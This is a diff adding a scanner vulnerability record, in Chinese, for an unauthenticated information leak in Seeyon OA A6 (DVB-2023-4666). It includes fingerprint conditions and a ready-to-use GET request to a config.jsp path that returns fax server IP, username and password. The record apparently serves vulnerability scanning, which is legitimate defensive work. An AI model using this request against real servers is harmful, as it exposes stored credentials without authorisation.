@@ -1,0 +1,8 @@
+vendor = "致远"
+name = "致远OA A6 config;jsp 敏感信息泄漏漏洞"
+type = "信息泄露"
+source = "DVB、TG"
+info = "DVB-2023-4666"
+date = "08.08"
+poc = "Name: 致远OA A6 config.jsp 敏感信息泄漏漏洞 Description: 北京致远互联软件股份有限公司成立于2002年，总部设立在北京，是一家始终专注于协同管理软件领域的高新技术企业，为客户提供专业的协同管理软件产品、解决方案、平台及云服务，是中国协同管理软件领域的开创者。致远OA A6 config.jsp页面可未授权访问，导致敏感信息泄漏漏洞，攻击者通过漏洞可以获取服务器中的敏感信息。 Identifier: DVB: DVB-2023-4666 VulnClass: - 信息泄漏 Category: - 应用服务 Manufacturer: 用友软件 Product: 用友致远A6 Type: 1 Status: 1 Scanable: 1 Level: 3 DisclosureDate: '2016-11-26' Is0day: false IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远OA\" || body=\"/yyoa/\" || header=\"Path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 session: false requests: - method: GET timeout: 10 path: /yyoa/ext/trafaxserver/SystemManage/config.jsp headers: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1349.136 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") && body.contains(\"faxServerIP\") && body.contains(\"faxServerUserName\") && body.contains(\"faxServerPassword\"))"
+label = "nday"
